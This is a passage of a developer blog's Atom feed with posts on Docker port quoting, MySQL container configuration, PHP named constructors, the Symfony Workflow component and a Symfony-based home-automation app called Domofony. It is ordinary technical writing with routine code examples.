  <p>When mapping ports in the HOST:CONTAINER format, you may experience erroneous results when using a container port lower than 60, because YAML parses numbers in the format xx:yy as a base-60 value. For this reason, we recommend always explicitly specifying your port mappings as strings.</p>
</blockquote>

<p><strong>So ALWAYS quote you ports mapping in order to express them as strings.</strong></p>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Symfony version manager]]></title>
            <link href="/blog/2021/01/25/wymfony-version-manager/"/>
            <updated>2021-01-25T09:40:00+01:00</updated>
            <id>/blog/2021/01/25/wymfony-version-manager/</id>
            <content type="html"><![CDATA[<h2 id="version-display.-what-for-%3F">Version display. What for ?</h2>

<p>From a long-term usage point of view, display application version is critical for <strong>marking</strong> purposes.
Your users can refer to this number when contacting support, and you can also use this number to quickly ensure
propoer deploy happened (among other tools provided by your CI/CD stack of course).</p>

<h2 id="how-to-handle-it-%3F">How to handle it ?</h2>

<p>Despite having the point in mind for a long, I never gave a go to a simple search around this topic.
Doing so I found <a href="https://github.com/shivas/versioning-bundle">Shivas versionning bundle</a>. It just does <strong>everything</strong> I wanted :</p>

<ul>
<li>Twig extension for version number management.</li>
<li>Several versions providers (from <code>VERSION</code> file to Git tag handling) tailored for common uses.</li>
<li><a href="https://semver.org/">SemVer</a> based.</li>
<li>Default formatters to let you go out-of-the-box</li>
</ul>

<p>As for all well-developed bundles, you can register your own providers &amp; formatters as services.</p>

<p>Cheers to its author for this work to the community.</p>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Simple  method to override configuration for your MySQL container]]></title>
            <link href="/blog/2020/09/10/simple-method-for-pimping-up-your-mysql-container/"/>
            <updated>2020-09-10T10:00:00+02:00</updated>
            <id>/blog/2020/09/10/simple-method-for-pimping-up-your-mysql-container/</id>
            <content type="html"><![CDATA[<h2 id="first-approach-%3A-wrong-one">First approach : wrong one</h2>

<p>All started while I was doing another dumb import, first using PhpMyAdmin. Despite the fact than the file wasn't
particularily large, it keeped ended by error <code>MySQL server has gone away</code> with a strange mention to missing data close
to an <code>ON</code> directive.</p>

<p>Few searches quickly pointed me on configuration directive <code>max_allowed_packet</code>. If too short, it indeed leads to above 
error. Beware the packet size here refers to a TCP packet, on transport layer. Too large query can trigger this.</p>

<p>As I use <a href="https://github.com/devgiants/docker-boilerplate-wordpress">my stack</a> for making project live on local, I first
thought that I would have to overkill stuff by making custom image from MySQL one, with overriding <code>my.ini</code>, exactly as I
did for <a href="https://github.com/devgiants/docker-boilerplate-wordpress/blob/master/docker/images/php-fpm7.3/Dockerfile">PHP container</a>.</p>

<p>Then I realized that exactly like PHP and Apache, a <code>conf.d</code> folder was existing with MySQL folder architecture.</p>

<h2 id="lightweight-approach">Lightweight approach</h2>

<p>So the solution was quite easier : just define a <code>override_max_packet_size.cnf</code> (you name it like you want), that lies
in <code>docker/images/mysql/conf</code>. I put this inside :</p>

<pre><code class="ini">[mysqld]
max_allowed_packet=64M
</code></pre>

<p>Then just mount a volume targeting this host folder and bind it with <code>/etc/mysql/conf.d</code></p>

<pre><code class="yaml">services:
  mysql:
    env_file: ./.env
    image: mysql:5.7
    ports:
      - ${MYSQL_HOST_PORT}:${MYSQL_PORT}
    environment:
      MYSQL_DATABASE: ${MYSQL_DATABASE}
      MYSQL_USER: ${MYSQL_USER}
      MYSQL_PASSWORD: ${MYSQL_PASSWORD}
      MYSQL_ROOT_PASSWORD: ${MYSQL_PASSWORD}
    volumes:
      - ${MYSQL_HOST_VOLUME_PATH}:/var/lib/mysql
      - ./docker/images/mysql/config:/etc/mysql/conf.d
</code></pre>

<p>Complete stack rebuild, and try to reimport : bingo, it works.
Using this method, you can safely override any MySQL configuration directive while keeping image untouched.</p>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Named constructor]]></title>
            <link href="/blog/2020/03/04/named-constructors/"/>
            <updated>2020-03-04T17:30:00+01:00</updated>
            <id>/blog/2020/03/04/named-constructors/</id>
            <content type="html"><![CDATA[<h2 id="how-to-create-an-instance-%3F">How to create an instance ?</h2>

<h3 id="classical-oop">Classical OOP</h3>

<p>In classical OOP approach, you will use the
<code>__construct</code> magic method to do the job. Let's reuse our <code>Ticket</code> entity 
described in <a href="https://devgiants.fr/blog/2020/03/02/symfony-workflow-component-walkthrough-part-1/">SymfonyWorkflow journey - part 1</a></p>

<pre><code class="php">/**
 * All attributes protected, stick to SOLID principles    
 */
class Ticket
{       
    protected $id;

    protected $title;

    /**
    * Classical constructor magic method
    */
    public function __construct()
    {

    }

}
</code></pre>

<p><em>Note : I cleared unnecessary stuff, such as getters/setters, annotations... 
So the rest look much more like a <strong>value object</strong>.</em></p>

<p>So far, so good. What's wrong with this? Nothing technically speaking, <strong>this does the job</strong>.
But what if the object is complex, and you have more than one way to create instance (from a business POV) ?
This is where <strong>named constructors</strong> come into light.</p>

<h3 id="named-constructor">Named constructor</h3>

<p>This is mostly a kind of static factory (a system to create an object) embedded in object class itself. Above example 
become :</p>

<p>```php
/**
  * All attributes protected, stick to SOLID principles<br />
  */
 class Ticket
 {<br />
     protected $id;</p>

<pre><code> protected $title;

 /**
 * Constructor becomes protected to ensure there is direct call
 */
 protected function __construct()
 {

 }

 /**
 * Named constructor example. Static to be called from class itself
 */
 public static function fromTitle(string $title): self
 {
    $ticket = new static();
    $ticket-&gt;setTitle($title);
    return $ticket;  
 } 
</code></pre>

<p>}
 ```</p>

<p>So instead of doing <code>$ticket = new Ticket()</code> you would do <code>$ticket = Ticket::fromTitle('new title')</code>.</p>

<p><em>Notes : 
- _Pay attention to <code>self</code> return type. This allow not to hardcode the class return type, hence offers 
dynamism on override (with precautions though).
- _In the same way, the <code>new static()</code> allow to instantiate current object instance. In case you extended <code>Ticket</code>,
you will obtain here the last-in-chain class type.</em></p>

<h2 id="advantages-and...-advantages">Advantages and... advantages</h2>

<p>Not really drawbacks here, let's focus on the advantages</p>

<h3 id="%C2%A0nice-semantics"> Nice semantics</h3>

<p><code>$ticket = Ticket::fromTitle('new title')</code> speaks for itself. More than creating an instance, you <strong>describe the
intent</strong> which is a key part in complex applications.</p>

<h3 id="override-constructors">Override constructors</h3>

<p>Unlike other languages (such as C++) , <strong>PHP can only have one constructor per class</strong>. If you stick to your class 
to get an instance, the only way to fulfill different instance creation scenarii is to:</p>

<ul>
<li>Low the signature exigence (parameters type-hinting, nullable,...)</li>
<li>Creates several checks and tests to ensure params passed on creation are still consistent</li>
</ul>

<p>As named constructors are simple static methods, and considering the fact that <code>__construct()</code> is no more available 
from outside world, you can create <strong>as much named constructors as you want</strong>. And guess what ?</p>

<ul>
<li>Design intents are still here (<code>Ticket::fromTitle()</code>, <code>Ticket::fromAnotherTicket()</code>...).</li>
<li>All coherence checks are separated and lies only in named constructor they belong to.</li>
</ul>

<p>Last but not least, this is totally <strong>framework agnostic</strong>. You can start using them now, with nothing but
intention.</p>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Symfony Workflow component - part 1]]></title>
            <link href="/blog/2020/03/02/symfony-workflow-component-walkthrough-part-1/"/>
            <updated>2020-03-02T13:30:00+01:00</updated>
            <id>/blog/2020/03/02/symfony-workflow-component-walkthrough-part-1/</id>
            <content type="html"><![CDATA[<p>The <a href="https://symfony.com/doc/current/components/workflow.html">Symfony Workflow component</a>, according to documentation,
allows to :</p>

<blockquote>
  <p>The Workflow component provides tools for managing a workflow or finite state machine.</p>
</blockquote>

<p>This one-line program can be breathtaking, when we measure the complexity the task can be.
This feeling passed away, let's see how this implementation can drastically help us to enforce some rules defined by 
<strong>places</strong> &amp; <strong>transitions</strong>.</p>

<p>As a reminder (from doc again), a workflow is</p>

<blockquote>
  <p>A way to define a process or a life cycle that your object goes through.</p>
</blockquote>

<h2 id="2-types-of-workflows">2 types of workflows</h2>

<p>There are 2 ways : <strong>workflow</strong> or <strong>finite state machine</strong>. Main difference is <strong>workflow allows subject to take simultaneous 
states as the same time</strong>, whereas finite state machine authorize <strong>only one at a time</strong>. This post focuses on the latter.
As a start, the finite state machine is easier to deal with.</p>

<h3 id="vocabulary">Vocabulary</h3>

<p>Let's define vocabulary first :</p>

<ul>
<li><strong>Place</strong> : given state marking the object status (for example "Draft", "Published", "Review"...).</li>
<li><strong>Transition</strong> : named action for moving from one place to another (for example "Publication" 
will drag the state marker from place "Draft" to place "Publish").</li>
<li><strong>Definition</strong> : set of places and transitions</li>
</ul>

<p>Let's focus on a classical ticket system, like Redmine. A workflow definition (simplified) could be :</p>

<p><img src="https://devgiants.fr/images/posts/workflow/ticket_workflow_example.png" alt="Ticket workflow example" /></p>

<p>We now have a definition. Let's transcript this in configuration :</p>

<p><kbd>workflow.yaml</kbd></p>

<pre><code class="yaml">framework:
  workflows:
    ticket:
      # Only one state at a time for target entities
      type: 'state_machine'

      # Make log trail cruise
      #      audit_trail:
      #        enabled: true
      marking_store:
        type: 'method'
        property: 'state'
      supports:
        - App\Entity\Ticket
      initial_marking: !php/const App\Workflow\Status\TicketStatuses::NEW
      places:
        - !php/const App\Workflow\Status\TicketStatuses::NEW
        - !php/const App\Workflow\Status\TicketStatuses::IN_PROGRESS
        - !php/const App\Workflow\Status\TicketStatuses::COMMENT
        - !php/const App\Workflow\Status\TicketStatuses::SOLVED
        - !php/const App\Workflow\Status\TicketStatuses::CLOSED
      transitions:
        !php/const App\Workflow\Transition\TicketTransitions::START_PROCESS:
          from:
            - !php/const App\Workflow\Status\TicketStatuses::NEW
            - !php/const App\Workflow\Status\TicketStatuses::COMMENT
          to: !php/const App\Workflow\Status\TicketStatuses::IN_PROGRESS
        !php/const App\Workflow\Transition\TicketTransitions::COMMENT:
          from: !php/const App\Workflow\Status\TicketStatuses::IN_PROGRESS
          to:   !php/const App\Workflow\Status\TicketStatuses::COMMENT
        !php/const App\Workflow\Transition\TicketTransitions::SOLVE:
          from: !php/const App\Workflow\Status\TicketStatuses::IN_PROGRESS
          to:   !php/const App\Workflow\Status\TicketStatuses::SOLVED
        !php/const App\Workflow\Transition\TicketTransitions::UNSOLVE:
          from: !php/const App\Workflow\Status\TicketStatuses::SOLVED
          to:   !php/const App\Workflow\Status\TicketStatuses::IN_PROGRESS
        !php/const App\Workflow\Transition\TicketTransitions::CLOSE:
          from: !php/const App\Workflow\Status\TicketStatuses::SOLVED
          to:   !php/const App\Workflow\Status\TicketStatuses::CLOSED
</code></pre>

<p><kbd>App\Workflow\Transition\TicketTransitions</kbd></p>

<pre><code class="php">&lt;?php

namespace App\Workflow\Transition;


final class TicketTransitions
{
    public const START_PROCESS = 'start_process';
    public const COMMENT = 'comment';
    public const SOLVE = 'solve';
    public const UNSOLVE = 'unsolve';
    public const CLOSE = 'close';
}
</code></pre>

<p><kbd>App\Workflow\Status\TicketStatuses</kbd></p>

<pre><code class="php">&lt;?php

namespace App\Workflow\Status;


final class TicketStatuses
{
    public const NEW = 'new';
    public const IN_PROGRESS = 'in_progress';
    public const COMMENT = 'comment';
    public const SOLVED = 'solved';
    public const CLOSED = 'closed';
}
</code></pre>

<p>You may note the heavy use of YAML PHP constant. YAML is therefore a bit less readable, but this allow to define in a clear way things in PHP 
and use them in YAML files. Coupling usage with Doctrine Enumerations (for example <a href="https://github.com/fre5h/DoctrineEnumBundle">DoctrineEnumBundle</a>) is good practice.</p>

<p><a href="https://symfony.com/doc/current/workflow.html#creating-a-workflow">Documentation</a> goes through keys and values expected regarding to this configuration.</p>

<h2 id="the-marking-store">The marking store</h2>

<p>I redefined on purpose the following part:</p>

<p><kbd>workflow.yaml</kbd></p>

<pre><code class="yaml">      marking_store:
        type: 'method'
        property: 'state'
</code></pre>

<p>The <code>property</code> key contains the entity attribute that will carry the state (the place)
the entity is. A <a href="https://symfony.com/blog/new-in-symfony-4-3-workflow-improvements">quite recent move</a> from core team 
introduce few things, especially <a href="https://symfony.com/blog/new-in-symfony-4-3-workflow-improvements#added-a-context-to-workflow-apply">context data</a> that can be useful.</p>

<p>So the <code>Ticket</code> entity will look like :</p>

<pre><code class="php">&lt;?php

namespace App\Entity;

use App\Behavior\Workflowable;
use Doctrine\Common\Collections\ArrayCollection;
use Doctrine\Common\Collections\Collection;
use Doctrine\ORM\Mapping as ORM;

/**
 * @ORM\Entity(repositoryClass="App\Repository\TicketRepository")
 */
class Ticket
{
    use Workflowable;

    /**
     * @ORM\Id()
     * @ORM\GeneratedValue()
     * @ORM\Column(type="integer")
     */
    protected $id;

    /**
     * @ORM\Column(type="string", length=255)
     */
    protected $title;

    /**
     * @ORM\ManyToOne(targetEntity="App\Entity\Ticket", inversedBy="relatedTickets")
     */
    protected $parentTicket;

    /**
     * @ORM\OneToMany(targetEntity="App\Entity\Ticket", mappedBy="parentTicket")
     */
    protected $relatedTickets;

    public function __construct()
    {
        $this-&gt;relatedTickets = new ArrayCollection();
    }

    public function getId(): ?int
    {
        return $this-&gt;id;
    }

    public function getTitle(): ?string
    {
        return $this-&gt;title;
    }

    public function setTitle(string $title): self
    {
        $this-&gt;title = $title;

        return $this;
    }

    public function getParentTicket(): ?self
    {
        return $this-&gt;parentTicket;
    }

    public function setParentTicket(?self $parentTicket): self
    {
        $this-&gt;parentTicket = $parentTicket;

        return $this;
    }

    /**
     * @return Collection|self[]
     */
    public function getRelatedTickets(): Collection
    {
        return $this-&gt;relatedTickets;
    }

    public function addRelatedTicket(self $relatedTicket): self
    {
        if (!$this-&gt;relatedTickets-&gt;contains($relatedTicket)) {
            $this-&gt;relatedTickets[] = $relatedTicket;
            $relatedTicket-&gt;setParentTicket($this);
        }

        return $this;
    }

    public function removeRelatedTicket(self $relatedTicket): self
    {
        if ($this-&gt;relatedTickets-&gt;contains($relatedTicket)) {
            $this-&gt;relatedTickets-&gt;removeElement($relatedTicket);
            // set the owning side to null (unless already changed)
            if ($relatedTicket-&gt;getParentTicket() === $this) {
                $relatedTicket-&gt;setParentTicket(null);
            }
        }

        return $this;
    }
}
</code></pre>

<p>You may note the trait <code>Workflowable</code>. All finite state machine will have the same attribute for carrying place,
so it can be DRYed like that :</p>

<pre><code class="php">&lt;?php


namespace App\Behavior;


trait Workflowable
{
    /**
     * @ORM\Column(type="string", length=15, nullable=false)
     *
     * @var string
     */
    protected $state;

    /**
     * @return string
     */
    public function getState(): ?string
    {
        return $this-&gt;state;
    }

    /**
     * @param string $state
     *
     * @return Workflowable
     */
    public function setState(string $state,  $context = []): self
    {
        $this-&gt;state = $state;

        return $this;
    }
}
</code></pre>

<h2 id="what-can-you-do-with-this-%3F">What can you do with this ?</h2>

<p>That being said, how can you lever the definition you just made ? Let's create a ticket and make a cruise :
The example is given in a controller for DI simplicy and easy access sake, but let's keep in mind that must not be done
in real projects (Single Responsability Principle, not for controller).</p>

<pre><code class="php">public function index(Registry $registry)
    {
        /*****************************************
         * Simple example
         */
        // Create new ticket
        $ticket = new Ticket();
        $ticket-&gt;setTitle('Nice title');

        // Find workflow by entity
        // Will throw an exception if a same entity is targeted by multiple workflows
        // unless you provide second argument
        $ticketWorkflow = $registry-&gt;get($ticket);

        // Apply transition
        // Will try to play the transition (move from A place to B place) on the given entity 
        $ticketWorkflow-&gt;apply($ticket, TicketTransitions::START_PROCESS);

        return $this-&gt;render('main.html.twig');
    }
</code></pre>

<p>The <code>apply</code> method will try to play transition for changing given entity state. 2 possibilities from here :</p>

<h3 id="given-transition-is-applyable">Given transition is applyable</h3>

<p>it means that transition <code>from</code> places contains actual entity state.</p>

<p><em>Example : as stated in configuration, initial marking for <code>Ticket</code> entity is <code>TicketStatuses::NEW</code> place. 
Quick_look to configuration confirms that this place is allowed as start place for TicketTransitions::START_PROCESS</em></p>

<p>The workflow given above is dead simple, but as most of you have noticed, <strong>you may specify more than one start place</strong>.
The opposite is not possible because you wouldn't know which place to pick up once transition done.</p>

<h3 id="given-transition-is-not-applyable">Given transition is not applyable</h3>

<p>The opposite from above. You can't apply this transition. If you try it, a <code>LogicException</code> will be raised :</p>

<h3 id="some-reflection">Some reflection</h3>

<p>For adding dynamism, you can make <strong>some reflection on workflow object</strong>. You can :</p>

<ul>
<li>Check if given entity can do transition : <code>$ticketWorkflow-&gt;can($ticket, TicketTransitions::START_PROCESS)</code></li>
<li>Retrieve available transitions for given entity : <code>$ticketWorkflow-&gt;getEnabledTransitions($ticket)</code></li>
</ul>

<p>Those 2 helpers are immensively useful, because <strong>you can safely make your object cruising according to runtime data</strong>.</p>

<h2 id="quick-conclusion">Quick conclusion</h2>

<p>I hope you realize how powerful this structure is and how it can help to strenghten you business rules,
by constraining entities to planned cruise during its lifetime.</p>

<p>Next post will focus on the real stuff : events dispatched by the system that will allow you to 
do the serious things.</p>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Domofony Symfony application - part 1]]></title>
            <link href="/blog/2019/10/13/domofony-symfony-application/"/>
            <updated>2019-10-13T11:30:00+02:00</updated>
            <id>/blog/2019/10/13/domofony-symfony-application/</id>
            <content type="html"><![CDATA[<p>This post presents some implementation &amp; architecture choices made for achieving previous exposed goal in <strong>home automation
platform development wich would be focus on code and yaml configuration</strong>.</p>

<p><img src="https://devgiants.fr/images/posts/domofony/technical_components_with_items.png" alt="Technical components" /></p>

<h2 id="items">Items</h2>

<p>As stated in <a href="https://devgiants.fr/blog/2019/10/12/domofony-presentation/">previous post</a>, items are the <strong>end-of-chain component</strong>, 
but also the most important part of this very chain (from home automation point-of-view): 
temperature sensor, switch, relay, devices with all of this... 
Actuators like switches will handle orders they receive through the MQTT bus (by listening on correct channels), 
while sensors will publish their data on time on the same bus. As central system <a href="https://github.com/devgiants/domofony/blob/master/src/Command/MainMQTTLoopCommand.php#L62">will listen to all channels</a>, 
it will have the capability to <strong>trigger good code portions regarding to what happens</strong>.</p>

<p>According to what explained above, <code>Item</code> does not deserve the Entity status. 
Each item will require code, that will lie on <code>ItemHandler</code>. 
So just add it as a record line in database is irrelevant.</p>

<p>That's why I decided the best way IMHO to declare and describe an <code>Item</code> was by <code>yaml</code> configuration. Here is a typical
declaration :</p>

<p><strong>config/services.yaml</strong></p>

<pre><code class="yaml">    items:
        west_wall_shutter_1:                        # The item ID
            handler: App\ItemHandler\TestHandler    # The handler FQCN
            api:                                    # API configuration
                accepted_arguments:                 # Accepted arguments
                    - open
                    - close
</code></pre>

<p>The item ID will be used as query parameter when invoking API <code>Item</code> endpoint (see below).</p>

<h2 id="items-handlers">Items handlers</h2>

<p>This application have to let you develop the behavior you want while providing you the context needed to take home automation decisions. 
So the goals are :</p>

<ul>
<li><strong>Let you write code within the application</strong> : only the code the application can't provide so <strong>your home automation code only</strong>.</li>
<li><strong>Automatic insertion</strong> of your custom code in application architecture. Neither complex configuration nor manual inclusion.</li>
</ul>

<h3 id="handler-creation">Handler creation</h3>

<p><strong>App\ItemHandler\TestHandler</strong></p>

<pre><code class="php">class TestHandler implements ItemHandlerInterface
{
    public function __invoke(array $payload, RequestInterface $request)
        {
            // TODO: Implement __invoke() method, using parameters
        }
}
</code></pre>

<p>Each <code>ItemHandler</code> must implements <code>ItemHandlerInterface</code>, so it will be recognized as real item handler. 
The handler FQCN will be the same as the one used in above configuration.</p>

<p>The payload is the one given when item update endpoint is consumed. The request is the classical HttpFoundation <code>Request</code>
object, in case you need more than payload to get context for your item handling.</p>

<h3 id="item-handler-tagging">Item handler tagging</h3>

<p>In order to make it work out-of-the-box without manual service registration, <strong>automatic service tagging</strong> is used :</p>

<p><strong>config/services.yaml</strong></p>

<pre><code class="yaml">services:
   #...

    _instanceof:
        App\Model\ItemHandlerInterface:
            tags: ['app.item_handler']
            lazy: true
</code></pre>

<p>Above configuration will add <code>app.item_handler</code> tag <strong>automatically to all classes implementing <code>App\Model\ItemHandlerInterface</code></strong></p>

<p>Next, <a href="https://symfony.com/blog/new-in-symfony-3-4-simpler-injection-of-tagged-services">quite recent feature from Symfony 3.4</a> allow to <strong>locate and collect all those tagged services to pass them as argument</strong> :</p>

<p><strong>config/services.yaml</strong></p>

<pre><code class="yaml">services:
    App\Controller\ItemUpdateController:
        arguments: [!tagged app.item_handler]
</code></pre>

<p>The argument got here is an <code>ìterable</code> :</p>

<p><strong>App\Controller\ItemUpdateController</strong></p>

<pre><code class="php">/**
 * Class ItemUpdateController
 *
 * @package App\Controller
 */
class ItemUpdateController extends AbstractController
{

    /**
     * @var iterable $itemHandlers
     */
    protected $itemHandlers;

    /**
     * ItemUpdateController constructor.
     *
     * @param iterable $itemHandlers
     */
    public function __construct(
        iterable $itemHandlers
    ) {
        $this-&gt;itemHandlers    = $itemHandlers;
    }

    // ....

}
</code></pre>

<p><em>Note : only relevant arguments are kept here, for sake of brevity. Complete file <a href="https://github.com/devgiants/domofony/blob/master/src/Controller/ItemUpdateController.php">here</a>.</em></p>

<h3 id="item-updater-behind-the-scene">Item updater behind the scene</h3>

<p>Now, we just have to invoke the matching item handler. This is done when <code>ItemUpdateController</code> is itself invoked :</p>

<p><strong>App\Controller\ItemUpdateController</strong></p>

<pre><code class="php">class ItemUpdateController extends AbstractController
{
    public function __invoke(
        string $id,
        RequestStack $requestStack,
        ItemFinder $itemFinder
    ) {
        // Find item
        $item = $itemFinder-&gt;findById($id);

        // Extract and create handler instance
        $handlerFQCN = $item-&gt;getHandlerFQCN();

        if ( ! class_exists($handlerFQCN)) {
            throw new ClassNotFoundException();
        }

        foreach ($this-&gt;itemHandlers as $itemHandler) {
            // If handler found, extract payload and invoke it
            if ($itemHandler instanceof $handlerFQCN) {
                $request = $requestStack-&gt;getCurrentRequest();
                $payload = json_decode($request-&gt;getContent());

                // Pre handler event
                $preHandlerEvent = new PreHandlerCallEvent($item, $payload,
                    $request);
                $this-&gt;eventDispatcher-&gt;dispatch($preHandlerEvent);

                // Item handler invocation
                call_user_func($itemHandler, $preHandlerEvent-&gt;getPayload(),
                    $preHandlerEvent-&gt;getRequest());

                // Post handler event
                $postHandlerEvent = new PostHandlerCallEvent($preHandlerEvent-&gt;getItem(),
                    $preHandlerEvent-&gt;getPayload(),
                    $preHandlerEvent-&gt;getRequest());
                $this-&gt;eventDispatcher-&gt;dispatch($preHandlerEvent);

                return $postHandlerEvent-&gt;getItem();
            }
        }

        return $item;
    }
}
</code></pre>

<p><em>Note : only relevant code is kept here, for sake of brevity. Complete file <a href="https://github.com/devgiants/domofony/blob/master/src/Controller/ItemUpdateController.php">here</a>.</em></p>

<h2 id="api-usage">API usage</h2>

<p>The application exposes an <code>Item</code> API, used for retrieving item state (<code>GET</code>), and also send updates (<code>PUT</code>).</p>

<p>Reusing <code>Ìtem</code> example configured above, REST requests endpoint would be <code>http://mydomain.com/api/item/west_wall_shutter_1</code>.</p>

<p>API part is handled by wonderful <a href="https://api-platform.com/">API Plaftorm</a>. As stated in first part of this post, 
I ended up to the fact that <code>Item</code> ar not real entity. As I treated them with yaml configuration, 
I needed <strong>custom DataProvider allowed by API Platform for retrieving data that are not in Doctrine</strong>:</p>

<p><strong>App\DataProvider\ItemDataProvider</strong></p>

<pre><code class="php">namespace App\DataProvider;

use ApiPlatform\Core\DataProvider\ItemDataProviderInterface;
use ApiPlatform\Core\DataProvider\RestrictedDataProviderInterface;
use App\Model\Item;
use App\Service\ItemFinder;

/**
 * Class ItemDataProvider
 *
 * @package App\DataProvider
 */
final class ItemDataProvider implements ItemDataProviderInterface, RestrictedDataProviderInterface
{

    /**
     * @var ItemFinder
     */
    protected $itemFinder;

    /**
     * ItemDataProvider constructor.
     *
     * @param ItemFinder $itemFinder
     */
    public function __construct(ItemFinder $itemFinder)
    {
        $this-&gt;itemFinder = $itemFinder;
    }

    /**
     * @inheritDoc
     */
    public function supports(
        string $resourceClass,
        string $operationName = null,
        array $context = []
    ): bool {
        return Item::class === $resourceClass;
    }

    /**
     * @inheritDoc
     */
    public function getItem(
        string $resourceClass,
        $id,
        string $operationName = null,
        array $context = []
    ) {
        return $this-&gt;itemFinder-&gt;findById($id);
    }
}
</code></pre>

<p>This <code>DataProvider</code> relies on an <code>ItemFinder</code> service that have access to the <code>items</code> declared in configuration.</p>

<p>API configuration misses now specific route configuration, as we got out of the normal CRUD scope.</p>

<p>This is done here for ItemGetterController (<code>GET</code> requests) :</p>

<p><strong>App\Controller\ItemGetterController</strong></p>

<pre><code class="php">namespace App\Controller;

use App\Service\ItemFinder;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\Routing\Annotation\Route;
use App\Model\Item;

/**
 * Class ItemGetterController
 *
 * @package App\Controller
 */
class ItemGetterController extends AbstractController
{
    /**
     * @Route(
     *     name="devgiants.domofony.item.get",
     *     path="/api/item/{id}",
     *     methods={"GET"},
     *     defaults={
     *       "_api_resource_class": "App\Model\Item",
     *       "_api_item_operation_name": "get"
     *     }
     * )
     *
     * @param string $id
     * @param ItemFinder $itemFinder
     * @return Item
     */
    public function __invoke(string $id, ItemFinder $itemFinder)
    {
        return $itemFinder-&gt;findById($id);
    }
}
</code></pre>

<p>And the same stands for <code>ItemUpdateController</code> :</p>

<p><strong>App\Controller\ItemUpdateController</strong></p>

<pre><code class="php">/**
 * Class ItemUpdateController
 *
 * @package App\Controller
 */
class ItemUpdateController extends AbstractController
{
    /**
     * @Route(
     *     name="devgiants.domofony.item.update",
     *     path="/api/item/{id}",
     *     methods={"PUT"},
     *     defaults={
     *       "_api_resource_class": "App\Model\Item",
     *       "_api_item_operation_name": "put"
     *     }
     * )
     *
     * @param string $id
     * @param RequestStack $requestStack
     * @param ItemFinder $itemFinder
     *
     * @return Item
     * @throws ClassNotFoundException
     */
    public function __invoke(
        string $id,
        RequestStack $requestStack,
        ItemFinder $itemFinder
    ) {
        // ...
    }
}
</code></pre>

<h2 id="bundle-versus-application">Bundle versus application</h2>

<p>At start, I wanted to make a bundle, that can be plugged onto any other application. 
I quickly realized that <strong>required specific configuration</strong> and <strong>above-described architecture</strong> 
needed <strong>a complete boilerplate application</strong>, that will be installable with a <code>composer create-project</code> command.</p>

<p>Furthermore, this app business purpose makes it quite exclusive regarding usage : it will be used only for home 
automation context and <strong>it's highly improbable that it will be added to other existing application</strong>.</p>

<h3 id="application-custom-extension">Application custom extension</h3>

<p>In order to be able to use custom configuration namespace, and trigger configuration checks, <strong>I registered a custom extension 
within the application itself</strong> (this configuration usually lies on bundle). This is done by manually registering the
extension in <code>Kernel</code> :</p>

<p><strong>App\Kernel</strong></p>

<pre><code class="php">class Kernel extends BaseKernel
{
    protected function configureContainer(ContainerBuilder $container, LoaderInterface $loader)
    {
        $devgiantsDomofonyExtension = new DevgiantsDomofonyExtension();

        $container
            -&gt;addResource(new FileResource($this-&gt;getProjectDir().'/config/bundles.php'))
            // Register extension to make configuration working
            -&gt;registerExtension($devgiantsDomofonyExtension)
        ;
        // ...
    }
}
</code></pre>

<p>We are done here with specific implementations that required enlightments. 
Next post will be dedicated to the <strong>security part</strong> and <strong>MQTT loop command</strong>.</p>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[Domofony presentation]]></title>
            <link href="/blog/2019/10/12/domofony-presentation/"/>
            <updated>2019-10-12T14:51:00+02:00</updated>
            <id>/blog/2019/10/12/domofony-presentation/</id>
            <content type="html"><![CDATA[<h2 id="home-automation">Home automation</h2>

<p>On my previous attempts on DIY home automation, I used the excellent <a href="https://www.openhab.org/">openHAB</a>.
At first glance, it seemed to have everything I looked for in an home automation context :</p>

<ul>
<li>Completely open-source</li>
<li><strong>Technology and vendor agnostic</strong> : one of the most important thing, I didn't want to rely on proprietary technology to build this system. Everything has to be transparent from ground to roof, and modifiable to ensure long-term usage and adaptation</li>
<li><strong>Ability to program for serious work</strong> : it's utterly important to me that real programmation feature would be available. Way I do things doesn't match with a click-land configuration job. Using <a href="https://www.eclipse.org/xtend/">Xtend</a> (because openHAB written in Java), it allows to create programs to drive your installation.</li>
</ul>

<p>So why change? Some cons :</p>

<ul>
<li>I realized after usage that all the stuff embedded (item branching with technologies, configuration...) simply wasn't for me</li>
<li>Xtend implementation in this usage, though really neat, does not allow things I wanted (such as script reuse accross handlers...)</li>
<li>All the Java stuff creates pressure on underlying hardware, thus forcing to have something powerful (old Raspberry Pis was not so good)</li>
</ul>

<p>Don't misunderstand me : OpenHAB is great job used y thousand of people accross the world. I just needed something else.</p>

<h2 id="domofony">Domofony</h2>

<p><em>Domotique</em> + <em>Symfony</em> = <a href="https://github.com/devgiants/domofony"><strong>Domofony</strong></a>.</p>

<p><em>Domotique</em> is the french word for home automation. First thing to know, I created this project for myself, and share it a good practice, but at start, not all things will be usable by everyone (such as the front-end app I plan to develop tailored to my use).</p>

<p><strong>This is a solution provided by a developer for developers</strong>. Exit click-land, all configuration is done in YAML.</p>

<h3 id="technical-components">Technical components</h3>

<p><img src="https://devgiants.fr/images/posts/domofony/technical_components_with_items.png" alt="Technical components" /></p>

<p>All part showed on above layout will be described and detailed in future posts. That being said, below is a quick description for bigger parts.</p>

<h4 id="front-end-application">Front-end application</h4>

<p>This is the application allowing user to interact with the system. It will consume REST API exposed by the server application.</p>

<h4 id="mosquitto-broker">Mosquitto broker</h4>

<p>The system relies so far on <a href="https://en.wikipedia.org/wiki/MQTT">MQTT protocol</a> 
(<a href="https://www.linkedin.com/pulse/mqtt-un-protocole-bas%C3%A9-sur-tcp-et-orient%C3%A9-iot-nicolas-bonniot/">here</a> a protocol tour in french) for exchanges between <strong>central system</strong> and <strong>items</strong>.
This protocol is ideal regarding it's asynchronous sequence and its lightweight. 
Security is not left aside, although TLS certificate usage means items must be more powerful than simple microcontrollers.</p>

<p><em>Note : an item is the end-device, such as sensor or actuator (or both). In my home automation system, this is mostly <a href="https://en.wikipedia.org/wiki/Single-board_computer">SBC</a> or ESP series microcontrollers</em></p>

<p>Future posts will handle in details <strong>items</strong>, <strong>Symfony application</strong>, <strong>Mosquitto broker &amp; client configuration</strong> and <strong>front-end application</strong>.</p>
]]></content>
        </entry>
            <entry>
